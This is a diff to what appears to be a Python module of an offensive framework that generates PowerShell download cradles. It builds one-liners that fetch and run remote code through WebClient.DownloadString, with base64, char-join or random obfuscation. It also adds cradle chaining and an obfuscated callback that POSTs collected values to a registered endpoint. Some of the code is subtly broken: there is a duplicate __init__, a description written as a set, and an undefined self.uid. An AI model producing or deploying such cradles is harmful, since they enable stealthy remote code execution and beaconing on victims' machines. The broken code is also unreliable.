@@ -2,17 +2,15 @@ import base64
 
 from abc import ABC, abstractmethod
 from typing import Any, Dict, List
-from core.obfuscate_getrandom import get_random_obfuscated_string
+from core.endpoint_registry import EndpointRegistry
+from core.obfuscate_getrandom import get_random_obfuscated_string as sgr
 
-class BaseCradle(ABC):
-    TYPE: str = "undefined"
-    SUBTYPE: str = "undefined"
+class BaseCradlePlugin(ABC):
+    NAME: str = "undefined"
     DESCRIPTION: str = "No description"
     AUTHOR: str = "Unknown"
     CONTENT_TYPE: str = "text/plain"
-    PAYLOAD_TYPE: str = "undefined"
-
-    FILE_OPTION_MAP: Dict[str, str] = {}
+    
     OPTIONS: Dict[str, Dict[str, Any]] = {
         "CONTENT_OBFUSCATION": {
             "description": (
@@ -27,8 +25,20 @@ class BaseCradle(ABC):
                 "none | base64 | char | getrandom"
             ),
             "default": "getrandom"
+        },
+        "NEXT_CRADLE": {
+            "description": {
+                "Next cradle to call when completed; set to UID or Index"
+            },
+            "default": 0
         }
     }
+
+    def __init__(self):
+        self._endpoint_registry = None
+
+    def __init__(self, endpoint_registry: EndpointRegistry):
+        self._endpoint_registry = endpoint_registry
     
     @abstractmethod
     def generate(self, options: dict, obfuscated: bool = True) -> str:
@@ -37,15 +47,25 @@ class BaseCradle(ABC):
 
     def cradle_command(self, cradle_url: str, options: dict) -> str:
         obs_cradle = options.get("CRADLE_OBFUSCATION","none").lower()
-        cradle = f".((New-Object System.Net.WebClient).DownloadString({cradle_url}))"
+        cradle = f".((New-Object System.Net.WebClient).DownloadString({cradle_url}));"
 
         if obs_cradle == "base64":
-            return f".([System.Text.Encoding]::UTF8::GetString([System.Convert]::FromBase64String({base64.b64encode(cradle.encode("utf-16-le")).decode()})))"
+            return f".([System.Text.Encoding]::UTF8::GetString([System.Convert]::FromBase64String({base64.b64encode(cradle.encode("utf-16-le")).decode()})));"
         elif obs_cradle == "char":
-            return f".(-join({[f"[char]{ord(c)}" for c in list(cradle)]}))"
+            return f".(-join({[f"[char]{ord(c)}" for c in list(cradle)]}));"
         elif obs_cradle == "getrandom":
-            return f".({get_random_obfuscated_string(cradle)})"
+            return f".({sgr(cradle)});"
         return f"{cradle}"
+    
+    def notification_callback_snippet(self, header_var_dict: dict) -> str:
+        notification_channel = self._endpoint_registry.create_notification_channel_for(self.uid)
+        snippet = f"""
+$responseJson = @{{
+{"\n".join(f"\t{x} = {header_var_dict[x]} | Out-String" for x in header_var_dict.keys())}
+}} | ConvertTo-Json
+Invoke-RestMethod -Uri "{self._endpoint_registry.get_cradle_command(notification_channel.uid)}" -Method Post -Body
+        """
+        return f".({sgr(snippet)});"
 
     
     def validate(self, options: dict) -> List[str]:
